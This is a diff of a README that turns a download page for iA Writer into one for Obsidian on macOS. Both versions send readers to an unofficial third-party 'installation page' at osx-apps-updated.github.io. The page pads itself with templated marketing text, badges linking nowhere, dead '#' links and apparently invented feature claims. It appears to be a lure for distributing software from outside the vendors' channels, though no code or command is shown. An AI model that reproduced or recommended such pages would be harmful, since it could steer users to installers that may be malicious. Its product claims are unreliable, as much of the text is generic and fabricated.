@@ -1,24 +1,24 @@
-# iA Writer Mac
+# Obsidian Mac
 
-<img src="https://cdn.jim-nielsen.com/macos/512/ia-writer-2015-09-25.png?rf=512" width="200" alt="App icon" align="left"/>
+<img src="https://forum.obsidian.md/uploads/default/original/3X/a/9/a9a34885821fff8941270ccd6e2ca923c83801b2.png" width="200" alt="App icon" align="left"/>
 
 <div>
-<h3>iA Writer mac</h3>
-<p>iA Writer delivers clean, focused writing environment that eliminates distractions and enhances productivity through thoughtful design.</p>
+<h3>Obsidian macOS</h3>
+<p>Obsidian is a specialized knowledge base and note-taking application for macOS designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://osx-apps-updated.github.io/.github/iawriter">
-  <img src="https://i.postimg.cc/RVQg9Yk1/badge.png" width="200" alt="Download"/>
+<a href="https://osx-apps-updated.github.io/.github/obsidian">
+  <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
 <br/><br>
 
 <div align="center">
 
-<a href="#"><img src="https://img.shields.io/badge/downloads-6.5k-brightgreen?style=flat" alt="downloads"/></a>
+<a href="#"><img src="https://img.shields.io/badge/downloads-8.9k-brightgreen?style=flat" alt="downloads"/></a>
 <a href="#"><img src="https://img.shields.io/badge/license-Standard%20License-lightgrey?style=flat" alt="license"/></a>
 <a href="#"><img src="https://img.shields.io/badge/platform-macOS-blue?style=flat" alt="platform"/></a>
 
-<img src="https://preview.redd.it/j2c7rw2zph7d1.jpg?width=800&format=pjpg&auto=webp&s=b48e8a321d6be312aa63364d0f6c8f0bf1b0aacf" width="824" alt="Screenshot"/>
+<img src="https://forum.obsidian.md/uploads/default/original/3X/8/6/86f21bbb47846321ae96f5675b2ef3515e38f210.jpeg" width="824" alt="Screenshot"/>
 
 </div>
 
@@ -27,47 +27,47 @@
 
 ## How to Install
 
-1. Click the "Download" button above to visit the iA Writer installation page.
-2. Follow the step-by-step instructions provided on the installation website to complete the iA Writer setup on your Mac.
+1. Click the "Download for macOS" button above to visit the Obsidian installation page.
+2. Follow the step-by-step instructions provided on the installation website to complete the Obsidian setup on your Mac.
 
 ---
 
 ## Overview
 
-<a href="#">iA Writer Mac</a> represents a refined text composition tool engineered with precision and attention to workflow efficiency. The interface prioritizes essential functions while maintaining access to advanced capabilities through logical organization and intuitive navigation patterns.
+<a href="#">Obsidian macOS</a> is a focused knowledge management software for macOS built to feel native on the Mac. It relies on system frameworks, familiar interface patterns and predictable behavior so users can integrate it into daily routines without friction. The layout emphasizes clarity, with tools grouped into logical sections that keep both power and simplicity within reach.
 
-Daily operation centers around streamlined interactions that minimize cognitive overhead. Core features remain immediately accessible while specialized tools stay organized within contextual menus and panels. This hierarchy ensures both novice users and experienced professionals can work efficiently without constant interface adjustment.
+In everyday use, Obsidian keeps core actions close at hand while offering additional <a href="#">advanced controls</a> for users who want to fine‑tune behavior. Menus, shortcuts and panels follow Apple's design language, helping you move quickly between tasks. Whether you are exploring features for the first time or returning to established workflows, the environment stays consistent and reliable.
 
-The application leverages modern system APIs and optimized algorithms to deliver consistent performance across varied workloads. Resource management operates transparently, maintaining responsive feedback during intensive operations while preserving battery life and system stability through intelligent task scheduling.
+Under the hood, Obsidian is engineered around <a href="#">macOS technologies</a> that handle performance‑critical work. This approach allows it to remain responsive even while applying filters, processing data or managing multiple resources at once. Background tasks are handled quietly, keeping the interface smooth so that scrolling, navigation and editing always feel responsive.
 
-Configuration flexibility accommodates diverse workflows without overwhelming users with excessive options. Preferences are organized into logical categories with clear descriptions, enabling customization of keyboard shortcuts, visual appearance, and behavioral patterns to match individual working styles and project requirements.
+For professionals, Obsidian supports more demanding knowledge management software scenarios with configurable options, presets and automation‑friendly behavior. Settings can be adjusted to match preferred habits, whether that means changing visual density, tuning keyboard shortcuts or adapting how the app interacts with other software. These options are organized using descriptive <a href="#">preference panels</a> rather than hidden configuration files.
 
-Integration with the broader ecosystem extends functionality beyond isolated operation. Support for standard file formats, automation protocols, and system services enables seamless data exchange with complementary tools while maintaining compatibility with established workflows and collaborative environments.
+The application integrates seamlessly with other macOS tools and services, supporting standard system features like Quick Look, Spotlight indexing, and iCloud synchronization. This deep integration means Obsidian works naturally alongside your existing workflow without requiring special configuration or workarounds. Files open quickly, previews generate instantly, and search results appear where you expect them.
 
-Performance characteristics reflect careful engineering decisions that balance capability with efficiency. Operations execute swiftly through optimized code paths while maintaining data integrity through robust error handling and automatic recovery mechanisms that protect work during unexpected interruptions.
+Performance optimization is central to the Obsidian experience. The app uses efficient algorithms and modern system APIs to minimize CPU usage and memory footprint while maximizing responsiveness. Even when working with large datasets or complex operations, the interface remains fluid and reactive. Progress indicators keep you informed during longer operations without blocking your ability to continue working.
 
-Long-term reliability stems from consistent behavior patterns and predictable responses. The application maintains stable operation across system updates while preserving user settings and project configurations, ensuring continuity of established workflows as the platform evolves.
+Over time, <a href="#">Obsidian</a> becomes a dependable part of the Mac environment. Its combination of refined interface decisions, efficient processing and thoughtful defaults makes it suitable for long‑term use. Users can trust that the application will behave consistently, preserve work safely and adapt as macOS continues to evolve.
 
 ---
 
 ## Major Features
 
-- Streamlined interface optimized for <a href="#">efficient workflows</a> with immediate access to essential tools
-- Advanced processing capabilities delivering <a href="#">professional results</a> through optimized algorithms
-- Flexible customization supporting <a href="#">personalized configurations</a> without excessive complexity
-- Comprehensive format support enabling <a href="#">seamless integration</a> with existing workflows
-- Intelligent automation reducing <a href="#">repetitive tasks</a> through configurable actions
-- Real-time feedback maintaining <a href="#">responsive interaction</a> during intensive operations
-- Robust data protection through <a href="#">automatic versioning</a> and recovery systems
-- Multi-device synchronization keeping <a href="#">projects consistent</a> across platforms
-- Extensive documentation providing <a href="#">clear guidance</a> through contextual help
+- System‑wide controls tailored for <a href="#">macOS workflows</a> with deep integration into native system components and services
+- Advanced tools and features with <a href="#">real‑time preview</a> capabilities that update instantly as you make changes
+- Project management and <a href="#">workflow optimization</a> tools designed to streamline repetitive tasks and improve efficiency
+- Customization tools to match <a href="#">user preferences</a> including interface themes, keyboard shortcuts, and behavioral settings
+- Integration features for <a href="#">productivity enhancement</a> that connect seamlessly with other applications in your workflow
+- Menu bar access for quick <a href="#">application control</a> allowing instant access to key functions without opening the main window
+- Automated backup and versioning systems that protect your work and allow easy recovery of previous states
+- Export and sharing options supporting multiple formats and direct integration with cloud storage services
+- Performance monitoring and optimization tools that help identify bottlenecks and improve processing efficiency
 
 ---
 
 ## Screenshots
 
 <p align="center">
-  <img src="https://cdn.macstories.net/cleanshot-2022-06-13-at-21-15-48-2x-1655172964590.png" width="824" alt="iA Writer screenshot"/>
+  <img src="https://forum.obsidian.md/uploads/default/original/2X/d/d75ba874efcfbee41f0ece8dc6d9d70637d9584b.gif" width="824" alt="Obsidian screenshot"/>
 </p>
 
 ---
@@ -76,20 +76,20 @@ Long-term reliability stems from consistent behavior patterns and predictable re
 
 | Component        | Requirement                         |
 |------------------|-------------------------------------|
-| Operating System | macOS 11.0 Big Sur or later                |
+| Operating System | macOS 10.13 High Sierra or later                |
 | CPU              | Intel or Apple Silicon processor              |
-| RAM              | 4 GB minimum                        |
-| Storage          | 100 MB available disk space              |
-| Internet         | Optional for iCloud sync   |
+| RAM              | 4 GB minimum (8 GB recommended)                        |
+| Storage          | 500 MB available disk space              |
+| Internet         | Optional for sync and community plugins   |
 
 ---
 
 ## Additional Information for macOS Users
 
-<a href="#">iA Writer Mac</a> delivers capabilities specifically tuned for the platform's strengths. The design respects established conventions while introducing refinements that enhance productivity without disrupting familiar interaction patterns.
+<a href="#">Obsidian</a> is often chosen by Mac users who want a dedicated knowledge management software that respects platform conventions. Its focused interface avoids unnecessary distractions and helps people stay in control of their workspace even during longer sessions.
 
-Workflow integration extends beyond basic functionality to support comprehensive automation and collaboration scenarios. The application cooperates with system services and third-party tools through standard protocols, enabling construction of sophisticated pipelines without custom scripting.
+In practice, the app slots neatly into broader <a href="#">macOS workflows</a>. It cooperates with backup tools, cloud sync services and automation utilities, so users do not need to reinvent their entire setup. Instead, they can extend what they already have with a reliable, specialized component.
 
-Professional environments benefit from deployment flexibility and management capabilities. Standardized configurations can be distributed across teams while individual customizations remain available, balancing consistency with personal productivity preferences.
+For teams and professionals, Obsidian offers a clear path to repeatable results. Settings can be standardized, documented and shared so everyone works from the same foundation. Over time, this consistency reduces friction and supports a healthier, more maintainable workflow pipeline.
 
 ---
